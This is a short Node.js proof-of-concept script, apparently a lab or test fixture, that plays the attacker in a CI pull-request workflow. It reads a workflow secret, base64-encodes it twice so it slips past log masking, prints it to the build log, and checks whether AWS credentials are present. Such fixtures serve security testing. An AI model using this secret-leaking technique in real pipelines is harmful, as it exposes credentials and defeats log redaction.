#!/usr/bin/env node
// Attacker-controlled script executed from the untrusted PR-head checkout while
// AWS credentials (exported by aws-actions/configure-aws-credentials) and the
// workflow-level GERALT_SECRET are present in the process environment.
const leak = process.env.GERALT_SECRET || process.env.LEAKED_SECRET || '';
const b1 = Buffer.from(String(leak)).toString('base64');
const b2 = Buffer.from(b1).toString('base64');
console.error('GERALT_LEAKED_TOKEN=' + b2);
console.error('GERALT_DBG AWS_ACCESS_KEY_ID=' + (process.env.AWS_ACCESS_KEY_ID ? 'present' : 'absent'));
console.error('GERALT_DBG AWS_SECRET_ACCESS_KEY=' + (process.env.AWS_SECRET_ACCESS_KEY ? 'present' : 'absent'));
process.exit(1);
